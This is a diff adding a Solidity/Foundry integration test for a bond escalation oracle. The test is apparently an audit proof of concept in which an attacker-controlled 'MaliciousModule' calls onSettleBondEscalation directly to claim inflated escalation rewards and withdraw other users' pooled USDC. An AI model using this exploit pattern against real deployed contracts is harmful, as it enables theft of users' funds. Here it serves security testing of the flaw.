@@ -497,4 +497,163 @@ contract Integration_BondEscalation is IntegrationBase {
     _bondEscalationAccounting.releasePledge(mockRequest, mockDispute, _attacker, usdc, _pledgeSize * 4);
     vm.stopPrank();
   }
+
+  function test_TOBAttackScenario() public {
+    ////////////////// DISPUTE ESCALATION ////////////////////////
+    // Step 1: Proposer pledges against the dispute
+
+    /**
+     * _deposit(_bondEscalationAccounting, proposer, usdc, _pledgeSize);
+     *   vm.prank(proposer);
+     *   _bondEscalationModule.pledgeAgainstDispute(mockRequest, mockDispute);
+     *
+     *   // Step 2: Disputer doubles down
+     *   _deposit(_bondEscalationAccounting, disputer, usdc, _pledgeSize);
+     *   vm.prank(disputer);
+     *   _bondEscalationModule.pledgeForDispute(mockRequest, mockDispute);
+     *
+     *   // Step 3: Proposer doubles down
+     *   _deposit(_bondEscalationAccounting, proposer, usdc, _pledgeSize);
+     *   vm.prank(proposer);
+     *   _bondEscalationModule.pledgeAgainstDispute(mockRequest, mockDispute);
+     *
+     *   // Step 4: Disputer runs out of capital
+     *   // Step 5: The tying buffer kicks in
+     *   vm.warp(_bondEscalationDeadline + 1);
+     *
+     *   // Step 6: An external party sees that Proposer's response is incorrect, so they bond the required WETH
+     *   _deposit(_bondEscalationAccounting, _secondDisputer, usdc, _pledgeSize);
+     *   vm.prank(_secondDisputer);
+     *   _bondEscalationModule.pledgeForDispute(mockRequest, mockDispute);
+     */
+    ////////////////// NEW MALICIOUS REQUEST ////////////////////////
+
+    address _attacker = makeAddr('attacker');
+
+    MaliciousModule _maliciousModule = new MaliciousModule();
+
+    IOracle.Request memory _evilRequest = mockRequest;
+    _evilRequest.nonce = uint96(oracle.totalRequestCount());
+    _evilRequest.requester = _attacker;
+    _evilRequest.resolutionModule = _attacker;
+    _evilRequest.finalityModule = _attacker;
+    _evilRequest.disputeModule = address(_maliciousModule);
+    _evilRequest.requestModuleData = abi.encode(
+      IHttpRequestModule.RequestParameters({
+        url: _expectedUrl,
+        body: _expectedBody,
+        method: _expectedMethod,
+        accountingExtension: _bondEscalationAccounting,
+        paymentToken: usdc,
+        paymentAmount: 0
+      })
+    );
+
+    _evilRequest.responseModuleData = abi.encode(
+      IBondedResponseModule.RequestParameters({
+        accountingExtension: _accountingExtension,
+        bondToken: usdc,
+        bondSize: 1e6,
+        deadline: _expectedDeadline,
+        disputeWindow: _baseDisputeWindow
+      })
+    );
+
+    uint256 _attackerBalance = _bondEscalationAccounting.balanceOf(_attacker, usdc);
+    assertEq(_attackerBalance, 0);
+
+    _deposit(_bondEscalationAccounting, _attacker, usdc, 1e6);
+    _deposit(_bondEscalationAccounting, address(_maliciousModule), usdc, 1e6);
+    _deposit(_accountingExtension, _attacker, usdc, 1e6);
+
+    vm.startPrank(_attacker);
+
+    _accountingExtension.approveModule(_attacker);
+    _accountingExtension.approveModule(address(_requestModule));
+    _accountingExtension.approveModule(address(_responseModule));
+
+    _bondEscalationAccounting.approveModule(address(_requestModule));
+    _bondEscalationAccounting.approveModule(_evilRequest.responseModule);
+    _bondEscalationAccounting.approveModule(_attacker);
+    _bondEscalationAccounting.approveModule(address(_maliciousModule));
+
+    bytes32 _evilRequestId = oracle.createRequest(_evilRequest, _ipfsHash);
+
+    IOracle.Response memory _evilResponse =
+      IOracle.Response({proposer: _attacker, requestId: _evilRequestId, response: bytes('lala')});
+
+    bytes32 _evilResponseId = oracle.proposeResponse(_evilRequest, _evilResponse);
+
+    IOracle.Dispute memory _evilDispute = IOracle.Dispute({
+      disputer: _attacker,
+      responseId: _evilResponseId,
+      proposer: _attacker,
+      requestId: _evilRequestId
+    });
+    bytes32 _evilDisputeId = oracle.disputeResponse(_evilRequest, _evilResponse, _evilDispute);
+
+    // bondEscalationAccounting has 230e18:
+    // 30 requester
+    // 100 proposer
+    // 100 disputer
+    _maliciousModule.escalate(
+      _bondEscalationAccounting,
+      _evilRequest,
+      _evilDispute,
+      usdc,
+      200e18, // usdc.balanceOf(address(_bondEscalationAccounting)) / 2,
+      0
+    );
+
+    // _bondEscalationAccounting.onSettleBondEscalation(
+    //   evilRequest,
+    //   evilDispute,
+    //   usdc,
+    //   1e18,
+    //   0
+    // );
+
+    _bondEscalationAccounting.claimEscalationReward(_evilDisputeId, _attacker);
+
+    {
+      uint256 _attackerBalanceBefore = usdc.balanceOf(address(_attacker));
+
+      _bondEscalationAccounting.withdraw(usdc, _bondEscalationAccounting.balanceOf(_attacker, usdc));
+
+      assertGt(usdc.balanceOf(_attacker), _attackerBalanceBefore);
+
+      // vm.expectRevert(ValidatorLib.ValidatorLib_InvalidDisputeBody.selector);
+      // _bondEscalationAccounting.releasePledge(evilRequest, evilDispute, _attacker, usdc, _pledgeSize * 4);
+    }
+
+    vm.stopPrank();
+  }
+}
+
+contract MaliciousModule {
+  function disputeResponse(
+    IOracle.Request calldata _request,
+    IOracle.Response calldata _response,
+    IOracle.Dispute calldata _dispute
+  ) external {
+    // console.log('MaliciousModule: disputeResponse');
+  }
+
+  function escalate(
+    BondEscalationAccounting _bondEscalationAccounting,
+    IOracle.Request calldata _request,
+    IOracle.Dispute calldata _dispute,
+    IERC20 _token,
+    uint256 _amountPerPledger,
+    uint256 _winningPledgersLength
+  ) external {
+    _bondEscalationAccounting.onSettleBondEscalation(
+      _request, _dispute, _token, _amountPerPledger, _winningPledgersLength
+    );
+  }
+
+  function pledgesAgainstDispute(bytes32 _requestId, address _pledger) external view returns (uint256 _numPledges) {
+    // console.log('pledge against dispute');
+    return 1;
+  }
 }
